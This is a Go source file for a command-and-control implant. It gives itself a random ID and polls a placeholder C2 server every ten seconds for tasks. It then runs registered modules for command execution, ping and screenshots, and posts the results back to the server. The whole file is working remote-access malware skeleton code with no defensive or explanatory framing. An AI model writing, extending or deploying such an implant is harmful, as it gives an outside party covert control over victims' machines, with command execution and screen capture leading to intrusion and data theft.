package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
	"github.com/google/uuid"
	"myimplant/modules"
)


type Implant struct {
	C2ServerURL string
	ImplantID    string
	Modules     map[string]modules.Module
}

func NewImplant(c2ServerURL string) *Implant {
	ImplantID := uuid.New().String()
	return &Implant{
		C2ServerURL: c2ServerURL,
		ImplantID:    ImplantID,
		Modules:     make(map[string]modules.Module),
	}
}

func (i *Implant) Start() {
	fmt.Println("Implant started with ID:", i.ImplantID)
	for {
		tasks, err := i.fetchTasks()
		if err != nil {
			fmt.Println("Error fetching tasks:", err)
			time.Sleep(10 * time.Second) // Sleep for a while before retrying
			continue
		}

		for _, task := range tasks {
			fmt.Println("Executing task:", task)
			response, err := i.executeTask(task)
			if err != nil {
				fmt.Println("Error executing task:", err)
				// Handle error sending response or retry logic if needed
			} else {
				fmt.Println("Task execution response:", response)
			}
		}

		// Sleep for a while before fetching the next set of tasks
		time.Sleep(10 * time.Second)
	}
}

func (i *Implant) fetchTasks() ([]string, error) {
	url := fmt.Sprintf("/tasks?ImplantID=%s", i.ImplantID)
	fmt.Println(url)
	resp, err := i.sendHTTPRequest("GET", url, nil)
	
	if err != nil {
		return nil, fmt.Errorf("error fetching tasks: %v", err)
	}
	defer resp.Body.Close()

	var tasks []string
	err = json.NewDecoder(resp.Body).Decode(&tasks)
	if err != nil {
		return nil, fmt.Errorf("error decoding tasks: %v", err)
	}

	return tasks, nil
}

func (i *Implant) executeTask(task string) (string, error) {
	moduleName := task 
	module, found := i.Modules[moduleName]
	if !found {
		return "", fmt.Errorf("module %s not found", moduleName)
	}

	// Execute module command
	result, err := module.Execute("")
	if err != nil {
		return "", fmt.Errorf("error executing module %s: %v", moduleName, err)
	}

	// Send response to C2 server
	responseData := map[string]string{
		"ImplantID":  i.ImplantID,
		"task":      task,
		"result":    result,
		"timestamp": time.Now().Format(time.RFC3339),
	}
	responseDataBytes, err := json.Marshal(responseData)
	if err != nil {
		return "", fmt.Errorf("error marshaling response data: %v", err)
	}

	_, err = i.sendHTTPResponse("/tasks/response", responseDataBytes)
	if err != nil {
		return "", fmt.Errorf("error sending task response: %v", err)
	}

	return result, nil
}

func (i *Implant) sendHTTPRequest(method, path string, data []byte) (*http.Response, error) {
	url := i.C2ServerURL + path
	req, err := http.NewRequest(method, url, bytes.NewBuffer(data))
	if err != nil {
		return nil, fmt.Errorf("error creating HTTP request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error sending HTTP request: %v", err)
	}
	return resp, nil
}

func (i *Implant) sendHTTPResponse(path string, data []byte) (*http.Response, error) {
	return i.sendHTTPRequest("POST", path, data)
}

func main() {
	c2ServerURL := "https://your-c2-server-url"

	implant := NewImplant(c2ServerURL)

	// Register modules
	implant.Modules["exec"] = modules.NewExecuteModule()
	implant.Modules["ping"] = modules.NewPingModule()
	implant.Modules["screenshot"] = modules.NewScreenshotModule()

	implant.Start()
}
